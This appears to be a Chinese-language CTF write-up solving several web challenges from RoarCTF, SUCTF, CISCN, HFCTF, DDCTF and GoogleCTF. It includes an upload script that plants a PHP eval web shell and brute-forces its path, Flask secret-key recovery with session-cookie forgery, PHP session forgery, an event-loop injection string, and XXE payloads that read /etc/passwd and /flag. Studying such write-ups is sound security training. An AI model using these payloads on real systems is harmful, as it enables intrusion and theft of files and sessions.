# Day02-12/13

## 0x01 [RoarCTF 2019]Simple Upload

一打开就是thinkphp了，**$upload = new \Think\Upload();**主题逻辑就在这一句了，我们看看是不是有什么漏洞

upload方法支持**多文件上传**。并且 我们试一试就知道

```
$upload->exts      =     array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
```

这个才是官网给的正确使用方式

所以我们爆破就yyds了!

**uniqid** 最后就是三个位数的差距。

所以这个过滤其实只有一句

```
if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
```

贴上大佬的exp:

https://blog.csdn.net/sopromeo/article/details/106472619

```
import requests
'''方法一'''
url = 'http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/index.php/home/index/upload'
s = requests.Session()

file1 = {"file":("shell","123",)}
file2 = {"file[]":("shell.php","<?php @eval($_POST[penson]);")} #批量上传用[]
r = s.post(url,files=file1)
print(r.text)
r = s.post(url,files=file2)
print(r.text)
r = s.post(url,files=file1)
print(r.text)

'''爆破'''

dir ='abcdefghijklmnopqrstuvwxyz0123456789'

for i in dir:
    for j in dir:
        for k in dir:
            for x in dir:
                for y in dir:
                    url = 'http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/Public/Uploads/2020-06-01/5ed4adac{}{}{}{}{}'.format(i,j,k,x,y)
                    print(url)
                    r = requests.get(url)
                    if r.status_code == 200:
                        print(url)
                        break
'''方法二'''
url = "http://9b96c9f8-7b74-491a-94fd-f8063d1b8a29.node3.buuoj.cn/index.php/home/index/upload/"
s = requests.Session()
files = {"file": ("shell.<>php", "<?php eval($_GET['cmd'])?>")}
r = requests.post(url, files=files)
print(r.text)

```

## 0x02 [SUCTF 2018]annonymous

```
匿名函数其实是有真正的名字，为%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)
```

脚本爆破 

```
import requests

for x in range(1000):
    payload = "http://4252621c-2a39-4f00-8bb4-445529a3257d.node4.buuoj.cn:81/?func_name=%00lambda_1"
    r=requests.get(payload)
    '''
    %d是持续递增的，这里的%d会一直递增到最大长度直到结束，通过大量的请求来迫使Pre-fork模式启动
Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了
    '''
    if 'flag' in r.text:
        print(r.text)
        break
    print('Testing.......')
```

## 0x03 [CISCN2019 华东南赛]WEB-4

是个任意文件读取了易上手。

首先读取环境变量

```
LANG=C.UTF-8SHELL=/bin/ashSHLVL=1WERKZEUG_RUN_MAIN=trueCHARSET=UTF-8PWD=/appWERKZEUG_SERVER_FD=3LOGNAME=glzjinUSER=glzjinHOME=/appPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPS1=\h:\w\$ PAGER=less
```

标准的python配置。

```
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

首先我们就要得到 (伪随机数的原理不用多说)

```
uuid.getnode() 从所有可用的地址中获得随机(或第一个)MAC 卡mac地址的十进制数 48位
```

我们需要去读取他的网卡地址

```
1 ifconfig命令查看网卡MAC地址
2 /sys/class/net/xxx/address查看
ip命令查看网卡MAC地址
```

`aa:cb:ba:0a:38:ea `注意使用python2和3都尝试一下哦

```
import uuid
import random

mac = "02:42:ac:10:9c:3a"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*233)
```

神器

```
flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.YJuCKw.COSA9fupuOO-gxLmD0q5u_lkLCY'
```

```
flask-unsign --sign --cookie '{'username':b'fuck'}' --secret  '222.550669756' --no-literal-eval
```

```
flask-unsign --sign --cookie "{'username':b'fuck'}" --secret  221.567620285 --no-literal-eval 
```

有空的时候加一下环境变量e/kali/.local/bin

## 0x03 [HFCTF2020]BabyUpload

```
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
```

这几句代码 我们可以看出这里获取flag的权限就是 admin +success.txt

但是我们发现我们不能控制文件名

```
file_exists() 函数检查文件或目录是否存在。
```

注意不仅是文件 目录也可以。我们创建目录即可。

然后就是伪造session文件

```
 sess_sessionid
```

```
<?php
session_save_path("./");
ini_set('session.serialize_handler', 'php_binary');
session_start();
$_SESSION['username'] = "admin";
```

![image-20211222212058934](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211222212058934.png)

![image-20211222212105868](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211222212105868.png)

两步构建

## 0x04 [DDCTF 2019]homebrew event loop

```
event_handler = eval(action + ('_handler' if is_action else '_function'))
```

关键代码不用解释

整体代码的逻辑就在于

![image-20211222213724904](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211222213724904.png)

绕过后缀的拼接，自己加入自己就可以多执行。buy5个钻石 最后eval getflag就可以了。

```
action:trigger_event#;action:buy;2#action:buy;3#action:get_flag;#
```

## 0x05 [GoogleCTF2019 Quals]Bnv

这个是xml学爆的一天

首先 **有json数据的地方就有xxe** 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message[
	<!ELEMENT message (#PCDATA)>
	<!ENTITY id '1233333333333'>
	<!ENTITY % dtd SYSTEM '/etc/passwd'>
	%dtd;
]>
<message>&id;</message>
```

可以验证这个实体成立了。

来读文件

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message[
	<!ELEMENT message (#PCDATA)>
	<!ENTITY id '1233333333333'>
	<!ENTITY % dtd SYSTEM '/etc/passwd'>
	%dtd;
]>
<message>&id;</message>
```

报错了，说明这个格式不正确呀。

所以现在需要一个本地的DTD文件https://mohemiv.com/tags/xxe/

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa 'Your DTD code'>
%local_dtd;
```

![image-20211222222709927](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20211222222709927.png)

这个回显可控可以做一个笔记。后面其实我们就不能查到了。 我们先读取flag，然后再读第二个文件的文件名设置为上面那个变量 然后加载出来就可以了。

```
<?xml version="1.0"?>
<!DOCTYPE message[
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///flag">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

